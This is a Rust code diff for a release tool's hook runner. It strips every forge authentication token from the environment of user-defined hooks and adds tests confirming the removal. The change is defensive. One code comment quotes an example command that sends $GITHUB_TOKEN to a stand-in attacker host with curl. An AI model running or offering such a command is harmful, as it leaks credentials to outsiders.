@@ -33,12 +33,45 @@ pub fn run_hook(
         command
     );
 
+    let mut cmd = build_hook_command(command, ctx, working_dir);
+
+    if verbose {
+        let status = cmd
+            .stdout(Stdio::inherit())
+            .stderr(Stdio::inherit())
+            .status()?;
+
+        if !status.success() {
+            return handle_failure(point, command, status.code(), on_failure);
+        }
+    } else {
+        let output = cmd.output()?;
+
+        if !output.status.success() {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let stderr = String::from_utf8_lossy(&output.stderr);
+            if !stdout.is_empty() {
+                eprint!("{stdout}");
+            }
+            if !stderr.is_empty() {
+                eprint!("{stderr}");
+            }
+            return handle_failure(point, command, output.status.code(), on_failure);
+        }
+    }
+
+    Ok(())
+}
+
+fn build_hook_command(command: &str, ctx: &HookContext, working_dir: &Path) -> Command {
     let mut cmd = build_command(command);
-    cmd.current_dir(working_dir)
-        .env_remove("GITHUB_TOKEN")
-        .env_remove("FERRFLOW_TOKEN")
-        .env_remove("GITLAB_TOKEN")
-        .env("FERRFLOW_PACKAGE", &ctx.package)
+    // Hooks are user-defined arbitrary shell — strip every token the tool
+    // authenticates with so a hook can't `curl evil.com -d $GITHUB_TOKEN`.
+    cmd.current_dir(working_dir);
+    for var in crate::config::all_token_env_vars() {
+        cmd.env_remove(var);
+    }
+    cmd.env("FERRFLOW_PACKAGE", &ctx.package)
         .env("FERRFLOW_OLD_VERSION", &ctx.old_version)
         .env("FERRFLOW_NEW_VERSION", &ctx.new_version)
         .env("FERRFLOW_BUMP_TYPE", &ctx.bump_type)
@@ -70,32 +103,7 @@ pub fn run_hook(
             ctx.error_code.as_deref().unwrap_or(""),
         );
 
-    if verbose {
-        let status = cmd
-            .stdout(Stdio::inherit())
-            .stderr(Stdio::inherit())
-            .status()?;
-
-        if !status.success() {
-            return handle_failure(point, command, status.code(), on_failure);
-        }
-    } else {
-        let output = cmd.output()?;
-
-        if !output.status.success() {
-            let stdout = String::from_utf8_lossy(&output.stdout);
-            let stderr = String::from_utf8_lossy(&output.stderr);
-            if !stdout.is_empty() {
-                eprint!("{stdout}");
-            }
-            if !stderr.is_empty() {
-                eprint!("{stderr}");
-            }
-            return handle_failure(point, command, output.status.code(), on_failure);
-        }
-    }
-
-    Ok(())
+    cmd
 }
 
 #[cfg(not(windows))]
@@ -176,5 +184,79 @@ mod tests {
         let result = handle_failure(HookPoint::PreCommit, "killed", None, OnFailure::Abort);
         assert!(result.is_err());
         assert!(format!("{:?}", result.unwrap_err()).contains("signal"));
+    }
+}
+
+#[cfg(test)]
+mod hook_env_tests {
+    use super::*;
+    use crate::config::{ForgeKind, all_token_env_vars};
+
+    fn ctx() -> HookContext {
+        HookContext {
+            package: "app".into(),
+            old_version: "1.0.0".into(),
+            new_version: "1.1.0".into(),
+            bump_type: "minor".into(),
+            tag: "v1.1.0".into(),
+            dry_run: false,
+            package_path: ".".into(),
+            channel: None,
+            error_code: None,
+            monorepo: false,
+            is_prerelease: false,
+            changelog: String::new(),
+            commits: Vec::new(),
+            bumped_files: Vec::new(),
+            all_packages: Vec::new(),
+            release_url: None,
+        }
+    }
+
+    fn removed_vars(cmd: &Command) -> Vec<String> {
+        cmd.get_envs()
+            .filter(|(_, value)| value.is_none())
+            .map(|(key, _)| key.to_string_lossy().into_owned())
+            .collect()
+    }
+
+    #[test]
+    fn every_forge_token_env_var_is_stripped_from_the_hook_environment() {
+        let cmd = build_hook_command("true", &ctx(), Path::new("."));
+        let removed = removed_vars(&cmd);
+
+        for var in all_token_env_vars() {
+            assert!(
+                removed.iter().any(|r| r == var),
+                "{var} reaches the hook environment; removed = {removed:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_stripped_list_covers_every_token_resolve_token_reads() {
+        let removed = removed_vars(&build_hook_command("true", &ctx(), Path::new(".")));
+
+        for kind in ForgeKind::ALL {
+            for var in kind.token_env_vars() {
+                assert!(
+                    removed.iter().any(|r| r == var),
+                    "{kind:?} authenticates with {var} but hooks still see it"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn context_variables_are_still_provided_to_the_hook() {
+        let cmd = build_hook_command("true", &ctx(), Path::new("."));
+        let provided: Vec<String> = cmd
+            .get_envs()
+            .filter(|(_, value)| value.is_some())
+            .map(|(key, _)| key.to_string_lossy().into_owned())
+            .collect();
+
+        assert!(provided.iter().any(|k| k == "FERRFLOW_NEW_VERSION"));
+        assert!(provided.iter().any(|k| k == "FERRFLOW_TAG"));
     }
 }
